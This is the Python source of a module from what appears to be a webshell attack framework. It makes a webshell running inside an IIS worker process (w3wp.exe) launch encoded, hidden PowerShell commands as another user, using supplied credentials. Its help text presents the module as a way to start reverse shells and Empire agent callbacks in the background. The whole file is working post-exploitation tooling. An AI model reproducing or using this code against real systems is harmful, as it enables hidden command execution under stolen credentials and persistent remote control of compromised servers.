from modules.runas import Runas, ModuleException
from utils.random_string import random_generator
from base64 import b64encode


class RunasPsModuleException(ModuleException):
    pass


class Runas_ps(Runas):
    _exception_class = RunasPsModuleException
    short_help = "Run a powershell.exe -enc spawning a new process as a specific user"
    complete_help = r"""
        This module permits run powershell.exe -nop -non -enc 'base64commands' command 
        from a local service in a new process running as a specific user.
        It runs the following Win32 System Calls 'LogonUser' -> 'DuplicateTokenEx' -> 'CreateProcessAsUser' in order 
        to spawn a new process out of calling thread of w3wp.exe.
        The calling process will wait until the end of the execution of the spawned process.
        The two processes will communicate through 2 pipeline files (1 for stdout and 1 for stderr).
        The default logon type is 3 (Network_Logon).
        If you set Interactive (2) logon type you will face some restriction problems.
        If you need to spawn a background or async process, i.e. spawning a reverse shell, set the argument
        'process_timeout_ms' to 0.
        
        Usage:
            #runas_ps os_command username password [domain] [process_timeout_ms] [logon_type] 
        
        Positional arguments:
            os_command              command supported by powershell.exe
            username                username of the user
            password                password of the user
            domain                  domain of the user, if in a domain. 
                                    Default: ''
            process_timeout_ms      the waiting time (in ms) to use in the WaitForSingleObject() function.
                                    This will halt the process until the spawned process ends and sent
                                    the output back to the webshell.
                                    If you set 0 an async process will be created and no output will be retrieved.
                                    Default: '60000'
            logon_type              the logon type for the spawned process.
                                    Default: '3'
        
        Examples:
            Run a command as a specific local user
                #runas_ps '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name' user1 password1
            Run a command as a specific domain user
                #runas_ps '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name' user1 password1 domain
            Run a background/async process as a specific local user, i.e. empire agent callback
                #runas_ps 'empire_agent_ps_code_raw' 'user1' 'password1' '' '0'
            Run a background/async process as a specific domain user, i.e. empire agent callback
                #runas_ps 'empire_agent_ps_code_raw' 'user1' 'password1' 'domain' '0'
    """

    def __gen_powershell_launcher(self, ps_code):
        powershell_launcher='powershell -nop -noni -enc '
        ps_code = '$ProgressPreference = "SilentlyContinue";' + ps_code
        powershell_launcher += str(b64encode(ps_code.encode('UTF-16LE')),'UTF-8')
        return powershell_launcher

    def _create_request(self, args):
        cmd, username, password, domain, process_ms_timeout, logon_type = self._parse_run_args(args)
        if '""' in cmd:
            cmd = cmd.replace('""', '"')
        cmd = self.__gen_powershell_launcher(cmd)
        working_path = self._module_settings['working_directory']
        stdout_file = self._module_settings['env_directory'] + '\\' + random_generator()
        stderr_file = self._module_settings['env_directory'] + '\\' + random_generator()
        return self._runtime_code % (username, password, domain, cmd, stdout_file, stderr_file,
                                     working_path, logon_type, process_ms_timeout)
